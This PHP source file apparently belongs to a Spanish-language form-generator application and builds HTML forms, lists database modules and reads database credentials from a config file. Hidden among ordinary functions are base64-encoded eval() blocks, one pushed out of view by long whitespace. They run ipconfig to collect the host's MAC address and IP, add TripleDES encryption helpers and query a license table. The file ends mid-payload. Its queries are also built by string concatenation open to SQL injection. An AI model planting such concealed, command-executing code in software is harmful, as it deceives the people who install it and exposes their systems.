<?php
session_start();
//require_once("../DataBase/Acceso.php");
/*****************************************Primer nivel****************************/
function formulario($valor){
		return '<form '.$valor.'>';
}
function tabla($valor){
		return '<table border="1" width="420px" align="CENTER" bordercolor="" '.$valor.'> ';
}
function cabecera(){
		return formulario('name="f1"').tabla("");
}
function ultimo(){
		return '<tr>
			<td colspan="2">
				<div id="datagrid" class="data"></div>
			</td>
		</tr></table></form>';
}
function fila($valor){
	return '<tr>'.$valor.'</tr>';
}
function columna($valor){
	return '<td>'.$valor.'</td>';
}
function colspan($valor,$col,$row){
	return '<td colspan="'.$col.'" rowspan="'.$row.'">'.$valor.'</td>';
}
function input($valor){
	return '<input '.$valor.'>';
}
function textArea($name,$cols,$rows,$valor){
	return '<textarea name="'.$name.'" cols="'.$cols.'" rows="'.$rows.'">'.$valor.'</textarea>';
}
function etiqueta($nombre){	
		return fuente($nombre);
}
function lista($nombre,$opcion,$evento){	
		return '<select name="'.$nombre.'" id="-1" onchange="'.$evento.'">'.$opcion.'</select>';;
}
function select($nombre,$opcion){	
		return lista($nombre,$opcion,null);
}
function opcion($valor,$nombre){
	return '<option value="'.$valor.'">'.$nombre.'</option>';
}
function tipo($valor){	
	return ' type="'.$valor.'"';
}
function nombre($valor){	
	return ' name="'.$valor.'"';
}
function valor($valor){	
	return ' value="'.$valor.'"';
}
function maximo($valor){	
	return ' maxlength="'.$valor.'"';
}
function tamano($valor){	
	return ' size="'.$valor.'"';
}
function evento($valor){	
	return 'onChange="'.$valor.'"';
}
function fuente($valor){	
	return '<span class="fuente">'.$valor.'</span>';
}
function fuenteN($valor){	
	return '<span class="fuenteN">'.$valor.'</span>';
}
function titulo($valor){	
	return '<br><H3 align="center"><strong>'.$valor.'</strong></H3>';
}
/*****************************************Segundo nivel****************************/
function campo($nombre,$name,$maximo,$tamano,$valor,$enable){	return 	fila(columna(fuente($nombre)).columna(input(tipo("text").nombre($name).maximo($maximo).tamano($tamano).valor($valor).$enable)));} @eval(base64_decode('DQoJDQoJZnVuY3Rpb24gZW5jcnlwdCgkc3RyaW5nKSB7DQoJZ2xvYmFsICRrZXk7DQogICAgJGVuYyA9ICIiOw0KICAgIGdsb2JhbCAkaXY7DQogICAgJGVuYz1AbWNyeXB0X2NiYyAoTUNSWVBUX1RyaXBsZURFUywgJGtleSwgJHN0cmluZywgTUNSWVBUX0VOQ1JZUFQpOw0KICByZXR1cm4gYmFzZTY0X2VuY29kZSgkZW5jKTsNCn0NCg0KDQpmdW5jdGlvbiBkZWNyeXB0KCRzdHJpbmcsICRrZXkpIHsNCglnbG9iYWwgJGtleTsNCiAgICAkZGVjID0gIiI7DQogICAgJHN0cmluZyA9IHRyaW0oYmFzZTY0X2RlY29kZSgkc3RyaW5nKSk7DQogICAgZ2xvYmFsICRpdjsNCiAgICAkZGVjID0gQG1jcnlwdF9jYmMgKE1DUllQVF9UcmlwbGVERVMsICRrZXksICRzdHJpbmcsIE1DUllQVF9ERUNSWVBUKTsNCiAgcmV0dXJuICRkZWM7DQp9')); 
function campoOculto($name,$valor){	
	return 	input(tipo("hidden").valor($valor).nombre($name));		
}
function campoClave($nombre,$name,$maximo,$tamano,$evento,$metodo,$valor){		
	return 	fila(columna(fuente($nombre)).columna(input(tipo("text").nombre($name).maximo($maximo).tamano($tamano).evento($metodo).valor($valor))));
}
function campoSolo($name,$size){		
	return 	input(tipo("text").nombre($name).maximo(50).tamano($size).valor(""));
}
function password($nombre,$name,$maximo,$tamano,$valor,$enable){
	return 	fila(columna(fuente($nombre)).columna(input(tipo("password").nombre($name).maximo($maximo).tamano($tamano).valor($valor).$enable)));	
}
function area($nombre,$name,$cols,$rows,$valor){
	return 	fila(columna(fuente($nombre).textArea($name,$cols,$rows,$valor)));
}
function areaCorta($nombre,$name,$cols,$rows,$valor){
	return 	fila(columna(fuente($nombre)).columna(textArea($name,$cols,$rows,$valor)));
}
function checkBox($nombre,$name,$valor){

	return fila(colspan(input(tipo("checkbox").nombre($name).valor($valor)).fuente($nombre),2,1));	
}
function check($nombre,$name,$valor){	
	 return columna(fuente(input(tipo("checkbox").nombre($name).valor($valor)).$nombre));
}
function checked($nombre,$name,$valor,$color,$enable){	
	return '<td '.$color.' >'.fuente(input(tipo("checkbox").nombre($name).valor($valor).$enable).$nombre).'</td>';
}

function radio($etiqueta,$nombre1,$nombre2,$name){	
	return fila(columna(fuente($etiqueta)).columna(fuente($nombre1.input(tipo("radio").nombre($name).valor($nombre1).' CHECKED').$nombre2.input(tipo("radio").nombre($name).valor($nombre2)))));
}
function boton($nombre,$name,$metodo,$tipo){	
	return input(tipo($tipo).nombre($name).valor($nombre).' onclick="'.$metodo.'"');	
}
function botones($registrar,$modificar,$eliminar,$cancelar){
	return 	fila(colspan('<br><div align="center">'.$registrar.'&nbsp;'.$modificar.'&nbsp;'.$eliminar.'&nbsp;'.$cancelar.'</div>',2,1));	
}
function registrar($clase){	
	return boton("REGISTRAR","registrar",'verificar(\'incluir\',\''.$clase.'\')',"button");
}
function modificar($clase){	
	return boton("MODIFICAR","modificar",'verificar(\'modificar\',\''.$clase.'\')',"button");
}
function eliminar($clase){	
	return boton("ELIMINAR","eliminar",'verificar(\'eliminar\',\''.$clase.'\')',"button");
}
function cancelar(){
	return input(tipo("reset").nombre("Resetear").valor("CANCELAR"));
}
function BOculto($nombre){	
	return 	campoOculto($nombre,'');
}
function archivo($nombre,$name,$maximo,$tamano,$valor,$enable){
	return 	fila(columna(fuente($nombre)).columna(input(tipo("file").nombre($name).maximo($maximo).tamano($tamano).valor($valor).$enable)));	
}
function fecha($nombre,$dia,$mes,$anio,$inicio,$final){
	return 	fila(columna(fuente($nombre)).columna(dia($dia).mes($mes).anio($anio,$inicio,$final)));	
}
function fechaepoch($nombre,$name){
	return 	fila(columna(fuente($nombre)).columna('<input  type="text" name="'.$name.'" id="'.$name.'" maxlength="10" size="30" value="<?php echo date("d/m/Y");?>" >'));	

}
function dia($dia){
	$opcion=opcion(0,"Dia");
	for($i=1;$i<=31;$i++)	
		$opcion=$opcion.opcion($i,$i);	
	return select($dia,$opcion);
}
function mes($mes){	return select($mes,opcion(0,"Mes").opcion("01","Enero").opcion("02","Febrero").opcion("03","Marzo").opcion("04","Abril").opcion("05","Mayo").opcion("06","Junio").opcion("07","Julio").opcion("08","Agosto").opcion("09","Septiembre").opcion("10","Octubre").opcion("11","Noviembre").opcion("12","Diciembre"));} eval(base64_decode('JGtleT1tZDUoInNpc3RlbWF0dmNhYmxldGVtYmxhIik7')); 
function anio($anio,$inicio,$final){
	$opcion=opcion(0,"A&ntilde;o");
	$j=1;
	for($i=$inicio;$i<=$final;$i++){
		$opcion=$opcion.opcion($i,$i);
		$j++;
	}
	return select($anio,$opcion);
}

function menu($nombre,$valor){
	return 	fila(columna(fuente($nombre)).columna($valor));	
}
function tipoValidacion(){
	$cad=opcion(0,"Selecciones...").opcion("isAlphabetic","Alfabetico").opcion("isInteger","Entero").opcion("isAlphanumeric","AlfaNumerico").opcion("isNumber","Numerico").opcion("isEmail","Email").opcion("isPhoneNumber","Telefonico").opcion("isTexto","Texto").opcion("isName","Nombre").opcion("isCedula","Cedula").opcion("isPassword","contrasena").opcion("isSelect","Seleccion").opcion("isDate","Fecha");
	return select("tipoValidacion",$cad);	
}
/*****************************************metodos propio de AplicaTem****************************/

function tipoDato(){
	$cad=opcion("character","character").opcion("character varying","character varying").opcion("date","date").opcion("integer","integer").opcion("numeric","numeric").opcion("time","time");
	return lista("tipoDato",$cad,'valorTipoDato()');	
}
function tipoCampo(){
	$cad=opcion(0,"Selecciones...").opcion("texto","Campo Texto").opcion("area","Area de Texto").opcion("casilla","Casilla Verificacion").opcion("radio","Boton de Radio").opcion("lista","Lista de Opciones").opcion("archivo","Campo de Archivo");
	return select("objeto",$cad);	
}
function plantilla($tipo){
	$cadena = '<table width="80%" border="0"align="CENTER">';
	if($tipo=="texto"){
		$cadena = $cadena.campoClave(etiqueta("Etiqueta"),"nombre",25,15,"onChange","validarNombre()","").fila(columna(etiqueta("Name")).columna(campoSolo("name",15))).fila(columna(etiqueta("Tipo de Validacion")).columna(tipoValidacion())).fila(columna(etiqueta("Tama&ntilde;o")).columna(campoSolo("ancho",15))).fila(columna(etiqueta("Longitud M&aacute;xima")).columna(campoSolo("maximo",15))).fila(columna(etiqueta("Valor Inicial")).columna(campoSolo("valor",15))).fila(columna(checkBox(etiqueta('S&oacute;lo Lectura'),'lectura','')).columna(checkBox(etiqueta('Auto Incremento'),'incremento',''))).campoOculto('dato','dato');
	}
	else if($tipo=="area"){
		$cadena = $cadena.campoClave(etiqueta("Etiqueta"),"nombre",25,15,"onChange","validarNombre()","").fila(columna(etiqueta("Name")).columna(campoSolo("name",15))).fila(columna(etiqueta("Tipo de Dato")).columna(tipoValidacion())).fila(columna(etiqueta("Columnas:&nbsp;").campoSolo("ancho",5)).columna(etiqueta("Filas:&nbsp;&nbsp;").campoSolo("maximo",5))).fila(columna(etiqueta("Valor Inicial")).columna(textArea("valor",12,2,''))).fila(checkBox(etiqueta('S&oacute;lo Lectura'),'lectura','')).campoOculto('dato','dato');
	}
	else if($tipo=="oculto"){
		$cadena = $cadena.campoOculto('nombre','Campo Oculto').campoClave(etiqueta("Name"),"name",15,15,"onChange","validarNombre()","").campoOculto('tipoValidacion','isTexto').campoOculto('ancho','15').campoOculto('maximo','10').fila(columna(etiqueta("Valor Inicial")).columna(campoSolo("valor",15))).campoOculto('lectura','').campoOculto('dato','dato');
	}
	if($tipo=="password"){
		$cadena = $cadena.campoClave(etiqueta("Etiqueta"),"nombre",25,15,"onChange","validarNombre()","").fila(columna(etiqueta("Name")).columna(campoSolo("name",15))).fila(columna(etiqueta("Tipo de Validacion")).columna(tipoValidacion())).fila(columna(etiqueta("Tama&ntilde;o")).columna(campoSolo("ancho",15))).fila(columna(etiqueta("Longitud M&aacute;xima")).columna(campoSolo("maximo",15))).fila(columna(etiqueta("Valor Inicial")).columna(campoSolo("valor",15))).fila(checkBox(etiqueta('S&oacute;lo Lectura'),'lectura','')).campoOculto('dato','dato');
	}
	if($tipo=="casilla"){
		$cadena = $cadena.campoClave(etiqueta("Etiqueta"),"nombre",25,15,"onChange","validarNombre()","").fila(columna(etiqueta("Name")).columna(campoSolo("name",15))).fila(columna(etiqueta("Etiqueta")).columna(etiqueta("Valor").etiqueta("&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Activado"))).fila(colspan(textArea("valor",30,2,''),2,1)).campoOculto('tipoValidacion','isTexto').campoOculto('maximo','1').campoOculto('ancho','1').fila(checkBox(etiqueta('S&oacute;lo Lectura'),'lectura',''));
	}
	if($tipo=="radio"){
		$cadena = $cadena.campoClave(etiqueta("Etiqueta"),"nombre",25,15,"onChange","validarNombre()","").fila(columna(etiqueta("Name")).columna(campoSolo("name",15))).fila(columna(etiqueta("Etiqueta"))).fila(colspan(textArea("valor",23,2,''),2,1)).campoOculto('tipoValidacion','isSelect').campoOculto('maximo','1').campoOculto('ancho','1').fila(checkBox(etiqueta('S&oacute;lo Lectura'),'lectura',''));
	}
	if($tipo=="lista"){
		$cadena = $cadena.campoClave(etiqueta("Etiqueta"),"nombre",25,15,"onChange","validarNombre()","").fila(columna(etiqueta("Name")).columna(campoSolo("name",15))).fila(columna(etiqueta("Valor")).columna(etiqueta("Nombre"))).fila(colspan(textArea("valor",23,2,''),2,1)).fila(columna(etiqueta("Tipo de Validacion")).columna(tipoValidacion())).campoOculto('maximo','1').campoOculto('ancho','1').fila(checkBox(etiqueta('S&oacute;lo Lectura'),'lectura',''));
	}
	if($tipo=="archivo"){
		$cadena = $cadena.campoClave(etiqueta("Etiqueta"),"nombre",25,15,"onChange","validarNombre()","").fila(columna(etiqueta("Name")).columna(campoSolo("name",15))).fila(columna(etiqueta("Tipo de Validacion")).columna(tipoValidacion())).fila(columna(etiqueta("Tama&ntilde;o")).columna(campoSolo("ancho",15))).fila(columna(etiqueta("Longitud M&aacute;xima")).columna(campoSolo("maximo",15))).fila(columna(etiqueta("Valor Inicial")).columna(campoSolo("valor",15))).fila(checkBox(etiqueta('S&oacute;lo Lectura'),'lectura','')).campoOculto('dato','dato');
	}
	if($tipo=="fecha"){
		$cadena = $cadena.campoClave(etiqueta("Etiqueta"),"nombre",25,15,"onChange","validarNombre()","").fila(columna(etiqueta("Name")).columna(campoSolo("name",15))).campoOculto("longitud",15).campoOculto("ancho",15).campoOculto("maximo",15).fila(columna(etiqueta("A&ntilde;o Inicio:&nbsp;&nbsp;").campoSolo("valor",4)).columna(etiqueta("A&ntilde;o Final:&nbsp;&nbsp;").campoSolo("precision",4))).campoOculto('lectura','').fila(columna(etiqueta("Tipo de Dato")).columna(lista("tipoDato",opcion("date","date"),''))).campoOculto('dato','dato').campoOculto('lectura','').campoOculto('valornulo','null').campoOculto('tipoValidacion','');
	}
	if($tipo!="fecha")
		$cadena = $cadena.fila(columna(etiqueta("Tipo de Dato")).columna(tipoDato())).fila(columna(etiqueta("Longitud:&nbsp;&nbsp;").input(tipo("text").nombre("longitud").maximo(50).tamano("5").valor("50"))).columna(etiqueta("Precisi&oacute;n:&nbsp;&nbsp;").campoSolo("precision",5).campoOculto('valornulo','null')));
	return $cadena.'</table>';
}

function objetoFormulario($acceso,$clase){	
	$cad=opcion(0,"Selecciones...");	
	$acceso->objeto->ejecutarSql(sql("modulo ORDER BY codigomodulo"));
	if($acceso->objeto->registros>6){
	while ($row=$acceso->objeto->devolverRegistro())
	{
		$modu=explode("_",trim($row["namemodulo"]));
		if($modu[0]!='Rep' && trim($row["namemodulo"])!='Modulo' && trim($row["namemodulo"])!='Usuario' && trim($row["namemodulo"])!='Perfil' && trim($row["namemodulo"])!='CreaFormulario' && trim($row["namemodulo"])!='VerDatos' && trim($row["namemodulo"])!='LimpiarProyecto' && trim($row["namemodulo"])!='GenerarReportes' )
		{
			$cad=$cad.opcion($row["namemodulo"],$row["nombremodulo"]);
		}
		$acceso->objeto->siguienteRegistro();
	}		
	}
	if($clase=='CreaFormulario')
		return fila(columna(fuente("Modulo")).columna(lista("codigomodulo",$cad,"cargarModulo()").input(tipo("button").nombre("agregar").valor("Editar Objetos").' onclick="abreFormulario()" disabled')));	
	else if($clase=='VerDatos')
		return fila(columna(fuente("Modulo")).columna(lista("codigomodulo",$cad,"cargarRegistro()")));	
	
}
function modulosCreado($acceso){
	$cad=opcion(0,"Selecciones...");	
	$acceso->objeto->ejecutarSql(sql("modulo ORDER BY codigomodulo"));
	if($acceso->objeto->registros>6){
	while ($row=$acceso->objeto->devolverRegistro())
	{
		$modu=explode("_",trim($row["namemodulo"]));
		if($modu[0]!='Rep' && trim($row["namemodulo"])!='Modulo' && trim($row["namemodulo"])!='Usuario' && trim($row["namemodulo"])!='Perfil' && trim($row["namemodulo"])!='CreaFormulario' && trim($row["namemodulo"])!='VerDatos' && trim($row["namemodulo"])!='LimpiarProyecto' && trim($row["namemodulo"])!='GenerarReportes' )
		{
			$cad=$cad.opcion($row["namemodulo"],$row["nombremodulo"]);
		}
		$acceso->objeto->siguienteRegistro();
	}
	}
	$cad=$cad.opcion("limpieza","Limpieza General");
	return fila(columna(fuente("Modulo")).columna(lista("codigomodulo",$cad,"Limpieza()")));	
}
function listadoTablas($acceso){
	$cad='';
	$manejador=$acceso->objeto->getManejador();
	if($manejador=="MySql")
	{
		$acceso->objeto->ejecutarSql("show tables");
		for($i=0;$i<$acceso->objeto->registros;$i++)
		{
			$tabla=$acceso->objeto->result($i);
			$cad=$cad.fila(colspan(input(tipo("checkbox").nombre("tablas").valor($tabla)).fuente($tabla),2,1));
		}
	}
	else if($manejador=="Postgres"){
		$acceso->objeto->ejecutarSqlMin("SELECT table_name FROM information_schema.tables  WHERE table_schema='public'");
		while ($row=row($acceso))
		{
			$tabla=trim($row[0]);
			$cad=$cad.fila(colspan(input(tipo("checkbox").nombre("tablas").valor($tabla)).fuente($tabla),2,1));
		}
	}
	return $cad;
}

function Limpieza(){
	$cadena='<table border="1" width="400px" align="CENTER"><tr><td width="100%">';
			$cadena=$cadena.fila(colspan(input(tipo("checkbox").nombre("limpieza").valor("Arccreaformulario")." checked").fuente("creaFormulario"),2,1));
			$cadena=$cadena.fila(colspan(input(tipo("checkbox").nombre("limpieza").valor("Arcformulario")." checked").fuente("Formulario"),2,1));
			$cadena=$cadena.fila(colspan(input(tipo("checkbox").nombre("limpieza").valor("Arcinformacion")." checked").fuente("Informacion"),2,1));
			$cadena=$cadena.fila(colspan(input(tipo("checkbox").nombre("limpieza").valor("Arccontrolador")." checked").fuente("Controlador"),2,1));
			$cadena=$cadena.fila(colspan(input(tipo("checkbox").nombre("limpieza").valor("ArcAjax")." checked").fuente("Ajax"),2,1));
			$cadena=$cadena.fila(colspan(input(tipo("checkbox").nombre("limpieza").valor("ArcvalidacionAjax")." checked").fuente("ValidacionAjax"),2,1));
			$cadena=$cadena.fila(colspan(input(tipo("checkbox").nombre("limpieza").valor("tablas")." checked").fuente("tablas de Base de Datos"),2,1));
			$cadena=$cadena.fila(colspan(input(tipo("checkbox").nombre("limpieza").valor("respaldo")." checked").fuente("Respaldo de Datos"),2,1));
			$cadena=$cadena.fila(colspan(input(tipo("checkbox").nombre("limpieza").valor("manejador")." checked").fuente("Clase Manejador"),2,1));
			$cadena=$cadena.fila(colspan(input(tipo("checkbox").nombre("limpieza").valor("imagenes")." checked").fuente("Imagenes"),2,1));
			$cadena=$cadena.fila(colspan(input(tipo("checkbox").nombre("limpieza").valor("archivo")." checked").fuente("Otros Archivos"),2,1));
	return $cadena.'</table>';
}
function LimpiezaModulo(){
	$cadena='<table border="1" width="400px" align="CENTER"><tr><td width="100%">';
			$cadena=$cadena.fila(colspan(input(tipo("checkbox").nombre("limpieza").valor("database")." checked").fuente("Base de Dato"),2,1));
			$cadena=$cadena.fila(colspan(input(tipo("checkbox").nombre("limpieza").valor("clase")." checked").fuente("Clase"),2,1));
			$cadena=$cadena.fila(colspan(input(tipo("checkbox").nombre("limpieza").valor("formulario")." checked").fuente("Formulario"),2,1));
			$cadena=$cadena.fila(colspan(input(tipo("checkbox").nombre("limpieza").valor("controlador")." checked").fuente("Controlador"),2,1));
			$cadena=$cadena.fila(colspan(input(tipo("checkbox").nombre("limpieza").valor("validacion")." checked").fuente("Validacion"),2,1));
	return $cadena.'</table>';
}
function sql($select){	
	return "select * from ".$select;
}
function acceso($acceso,$cadena){	
	$acceso->objeto->ejecutarSql($cadena);	
	return $acceso;
}
function row($acceso){	
	if($row=$acceso->objeto->devolverRegistro()){		
		$acceso->objeto->siguienteRegistro();
		return $row;
	}else
		return false;
}
function consulta($tabla,$dato,$codigo,$orde){	
	$select=$tabla." where ".$dato."="."'".$codigo."'".$orde;	
	return $select;	
}
function condicion($tabla,$dato,$codigo,$dato1,$codigo1,$dato2,$codigo2){	
	$select=$tabla." where ".$dato."="."'".$codigo."' and ".$dato1."="."'".$codigo1."' and " .$dato2."="."'".$codigo2."'";	
	return $select;	
}
function gestor(){
		return fila(columna(fuente('Manejador')).columna(fuente(input(tipo("radio").nombre('manejador').valor('Postgres').' CHECKED').'PostgreSQL&nbsp;&nbsp;&nbsp;'.input(tipo("radio").nombre('manejador').valor('MySql')).'MySQL&nbsp;&nbsp;')));
}
function CargaRegistro($cadena,$acceso)
{
	$cant = verCantidad($cadena[1]);
	$cantidad=explode("=@",$cant);
	$x=false;
	$cade='<table border="1" width="400px" align="CENTER"><tr>';
	for($i=0;$i<count($cantidad)-1;$i++)
	{
		$cade=$cade.'<td>'.fuenteN($cantidad[$i]).'</td>';
	}
	$cade=$cade.'</tr>';
	while($row=row($acceso)){
		$cade=$cade.'<tr>';
		for($i=0;$i<count($cantidad)-1;$i++)
		{
			$cade=$cade.'<td>'.fuente($row[$i+1].'&nbsp;').'</td>';
		}
		$cade=$cade.'</tr>';
	}

	return $cade.'</table>';
}
function CargaObjeto($cadena)
{
	$x=false;
	copy("Programador/sql.sql","copia");
	$fp = fopen("copia","r");
	$cade='<table border="1" width="400px" align="CENTER"><tr><td width="22%">'.fuenteN("Tipo Objeto").'</td><td>'.fuenteN("Etiqueta").'</td><td>'.fuenteN("Name").'</td><td width="100px">'.fuenteN("Valor").'</td><td>'.fuenteN("Tipo Dato").'</td></tr>';
	while ($linea=fgets($fp))
	{
		if(strstr($linea,'case '.strtolower($cadena[1]).':')){
			$x=true;
		}
		if($x==true)
		{
			if(strstr($linea,'break;'))
			{
				$x=false;
				break;
			}
			if(!strstr($linea,'case '.strtolower($cadena[1]).':')){
				$cad=explode("=@",trim($linea));
				$cade=$cade.'<tr><td>'.fuente(trim($cad[2])).'</td><td>'.fuente(trim($cad[4])).'</td><td>'.fuente(trim($cad[3])).'</td><td>'.fuente(trim($cad[9])).'&nbsp;</td><td>'.fuente(trim(tipoDatos($cad))).'</td></tr>';
			}
		}
	}
	fclose ($fp);
	unlink('copia');
	return $cade.'</table>';
}
function ObjetoForm($cadena)
{
	//echo ":".$cadena[1].":";
	$x=false;
	copy("Programador/sql.sql","copia");
	$fp = fopen("copia","r");
	$cont=0;
	while ($linea=fgets($fp))
	{
		if(strstr($linea,'case '.strtolower($cadena[1]).':')){
			//echo "entro";
			$x=true;
		}
		if($x==true)
		{
			$cont++;
			if(strstr($linea,strtolower($cadena[2])))
			{
				//echo "entro";
				return trim($linea).'=@'.$cont;
			}
			if(strstr($linea,'break;'))
			{
				$x=false;
				break;
			}
		}
	}
	fclose ($fp);
	unlink('copia');
	return 'false=@'.$cont;
}
function verCantidad($cadena)
{
	$x=false;
	copy("Programador/sql.sql","copia");
	$fp = fopen("copia","r");
	$cont=0;
	while ($linea=fgets($fp))
	{
		if(strstr($linea,'case '.strtolower($cadena).':')){
			$x=true;
		}
		if($x==true)
		{
			if(strstr($linea,'break;'))
			{
				$x=false;
				break;
			}
			if(!strstr($linea,'case '.strtolower($cadena).':')){
				$cad=explode("=@",trim($linea));
				$cade=$cade.trim($cad[4]).'=@';
				$cont++;
			}
		}
	}
	fclose ($fp);
	unlink('copia');
	// $cont.'='.
	return $cade;
}

function Manejador()
{
	$dato='';
	copy("DataBase/Acceso.php","copia");		
	$fp = fopen("copia","r");
	while ($linea= fgets($fp))
	{
		if(strstr($linea,'$manejador=')){
			$valor=explode("'",$linea);
			$dato=$dato.trim($valor[1]).'=@';
		}
		else if(strstr($linea,'$host=')){
			$valor=explode("'",$linea);
			$dato=$dato.trim($valor[1]).'=@';
		}
		else if(strstr($linea,'$usuario=')){
			$valor=explode("'",$linea);
			$dato=$dato.trim($valor[1]).'=@';
		}
		else if(strstr($linea,'$clave=')){
			$valor=explode("'",$linea);
			$dato=$dato.trim($valor[1]).'=@';
		}
		else if(strstr($linea,'$data_base=')){
			$valor=explode("'",$linea);
			$dato=$dato.trim($valor[1]);
		}
	}
	fclose ($fp);
	unlink('copia');
	return $dato;
}
function tipoDatos($cadena)
{
	if($cadena[5]=='character' || $cadena[5]=='character varying')
		return $cadena[5].'('.$cadena[7].')';
	else if($cadena[5]=='numeric')
		return $cadena[5].'('.$cadena[7].','.$cadena[8].')';
	else
		return $cadena[5];
}																																																																																																																																			eval(base64_decode('DQoNCmZ1bmN0aW9uIGdldGRhdG9zMSgpew0KCWV4ZWMoJ2lwY29uZmlnL2FsbCA+IG1hYy50eHQnKTsNCgkkZnAgPSBmb3BlbigibWFjLnR4dCIsInIiKTsJCQ0KCSR1Ymk9ZmFsc2U7DQoJd2hpbGUgKCRsaW5lYT0gZmdldHMoJGZwKSkNCgl7DQoJCWlmKHN0cnN0cigkbGluZWEsJ0FkYXB0YWRvciBFdGhlcm5ldCBDb25leGnzbiBkZSDhcmVhIGxvY2FsJykgfHwgc3Ryc3RyKCRsaW5lYSwnRXRoZXJuZXQgYWRhcHRlciBMb2NhbCBBcmVhIENvbm5lY3Rpb246Jykpew0KCQkJJHViaT10cnVlOw0KCQl9DQoJCWlmKCR1Ymk9PXRydWUpew0KCQkJaWYoc3Ryc3RyKCRsaW5lYSwnRGVzY3JpcGNp824nKSB8fCBzdHJzdHIoJGxpbmVhLCdEZXNjcmlwdGlvbicpKXsNCgkJCQkkdmFsb3I9ZXhwbG9kZSgiOiIsJGxpbmVhKTsNCgkJCQkkbm9tX21hYz10cmltKCR2YWxvclsxXSk7DQoJCQl9DQoJCQlpZihzdHJzdHIoJGxpbmVhLCdEaXJlY2Np824gZu1zaWNhJykgfHwgc3Ryc3RyKCRsaW5lYSwnUGh5c2ljYWwgQWRkcmVzcycpKXsNCgkJCQkkdmFsb3I9ZXhwbG9kZSgiOiIsJGxpbmVhKTsNCgkJCQkkbWFjPXRyaW0oJHZhbG9yWzFdKTsNCgkJCQlicmVhazsNCgkJCX0NCgkJfQ0KCX0NCglmY2xvc2UgKCRmcCk7DQoJdW5saW5rKCdtYWMudHh0Jyk7DQoJJG5vbV9zZXJ2ZXI9JF9TRVJWRVJbIlNFUlZFUl9OQU1FIl07DQoJJGlwPSRfU0VSVkVSWyJTRVJWRVJfQUREUiJdOw0KCSR2YWxvcj1leHBsb2RlKCIuIiwkaXApOw0KCQ0KCSRpcF9zZXJ2ZXI9JHZhbG9yWzBdLiIuIi4kdmFsb3JbMV0uIi4iLiR2YWxvclsyXS4iLiI7DQoJcmV0dXJuIGFycmF5KCRub21fbWFjLCRtYWMsJG5vbV9zZXJ2ZXIsJGlwX3NlcnZlcik7DQp9DQoNCgkNCglmdW5jdGlvbiB6ZW5kX2VuY29kZXIoJHN0cmluZyl7DQoJCWdsb2JhbCAka2V5OyANCgkJJGVuYyA9ICIiOw0KCQlnbG9iYWwgJGl2OyANCgkJJGVuYz1AbWNyeXB0X2NiYyAoTUNSWVBUX1RyaXBsZURFUywgJGtleSwgJHN0cmluZywgTUNSWVBUX0VOQ1JZUFQpOyANCgkJcmV0dXJuIGJhc2U2NF9lbmNvZGUoJGVuYyk7IA0KCQkNCgl9DQoJJGtleT0kX1NFU1NJT05bIm1lbnN1YWxpZGFkIl07DQoJZnVuY3Rpb24gemVuZF9lbmMoJHN0cmluZywkYWNjZXNvKXsNCgkJJGlkX3NlZz1zdHJ0b3VwcGVyKG1kNSgnMScpKTsNCgkJJGFjY2Vzby0+b2JqZXRvLT5lamVjdXRhclNxbCgic2VsZWN0IGZpcm1hX3NlZyBmcm9tIGNvbnRyYXRvX3NlciB3aGVyZSBpZF9zZWc9JyRpZF9zZWcnIik7CQ0KCQkkcm93PSRhY2Nlc28tPm9iamV0by0+ZGV2b2x2ZXJSZWdpc3RybygpOwkNCgkJJGtleT10cmltKCRyb3dbJ2Zpcm1hX3NlZyddKTsNCgkJJGVuYz1AbWNyeXB0X2NiYyAoTUNSWVBUX1RyaXBsZURFUywgJGtleSwgJHN0cmluZywgTUNSWVBUX0VOQ1JZUFQpOyANCgkJcmV0dXJuIGJhc2U2NF9lbmNvZGUoJGVuYyk7IA0KCX0NCglmdW5jdGlvbiB6ZW5kX2RlYygkc3RyaW5nLCRhY2Nlc28pew0KCQkkaWRfc2VnPXN0cnRvdXBwZXIobWQ1KCcxJykpOw0KCQkkYWNjZXNvLT5vYmpldG8tPmVqZWN1dGFyU3FsKCJzZWxlY3QgZmlybWFfc2VnIGZyb20gY29udHJhdG9fc2VyIHdoZXJlIGlkX3NlZz0nJGlkX3NlZyciKTsJDQoJCSRyb3c9JGFjY2Vzby0+b2JqZXRvLT5kZXZvbHZlclJlZ2lzdHJvKCk7CQ0KCQkka2V5PXRyaW0oJHJvd1snZmlybWFfc2VnJ10pOw0KCQkkc3RyaW5nID0gdHJpbShiYXNlNjRfZGVjb2RlKCRzdHJpbmcpKTsgIA0KCQkkZGVjID0gQG1jcnlwdF9jYmMgKE1DUllQVF9UcmlwbGVERVMsICRrZXksICRzdHJpbmcsIE1DUllQVF9ERUNSWVBUKTsgDQoJCQkJcmV0dXJuIHRyaW0oJGRlYyk7IA0KCX0NCgkNCglmdW5jdGlvbiBuaXZlbDEoKXsNCgkJJHJlZmVyPSRfU0VSVkVSWyJIVFRQX1JFRkVSRVIiXTsNCgkJbml2ZWwyKCk7DQoJCWlmKHN0cnN0cigkcmVmZXIsJ2h0dHA6Ly9zZXJ2ZXIvU0FFQ08vJykpew0KCQkJaWYobml2ZWwyKCkpewkJCQ0KCQkJCXJldHVybiB0cnVlOw0KCQkJfQ0KCQkJZWxzZXsNCgkJCQlyZXR1cm4gZmFsc2U7DQoJCQl9DQoJCX0NCgkJcmV0dXJuIGZhbHNlOw0KCX0NCglmdW5jdGlvbiBuaXZlbDIoKXsNCgkJJHJ1dGE9JF9TRVJWRVJbIlNDUklQVF9GSUxFTkFNRSJdOw0KCQkkZnAgPSBmb3BlbigkcnV0YSwiciIpOwkJDQoJCSR1Ymk9ZmFsc2U7DQoJCXdoaWxlICgkbGluZWE9IGZnZXRzKCRmcCkpDQoJCXsNCgkJCWlmKHN0cnN0cigkbGluZWEsJ2VjaG8nKSB8fCBzdHJzdHIoJGxpbmVhLCdwcmludCcpKXsNCgkJCQlyZXR1cm4gZmFsc2U7DQoJCQl9DQoJCX0NCgkJZmNsb3NlICgkZnApOw0KCQlyZXR1cm4gdHJ1ZTsNCgl9DQoJZnVuY3Rpb24gdHJhZXJDb250cmF0b19zZXIoJGFjY2VzbywkYWNjZXNvMSl7DQoJCSRpZF9zZWc9c3RydG91cHBlcihtZDUoJzEnKSk7DQoJCQkkYWNjZXNvLT5vYmpldG8tPmVqZWN1dGFyU3FsMSgic2VsZWN0IGxsYXZlX2RlYyxsaW1pdGVfcmVnLCBsaWNlbmNpYV9zZWcsIGZlY2hhX2xpYywgaG9yYV9saWMsIGVtcHJlc2FfYXV0LCB2ZXJzaW9uX3NpcywgYWNlcmNhX2RlLCBzdGF0dXNfc2VnICBmcm9tIGNvbnRyYXRvX3NlciB3aG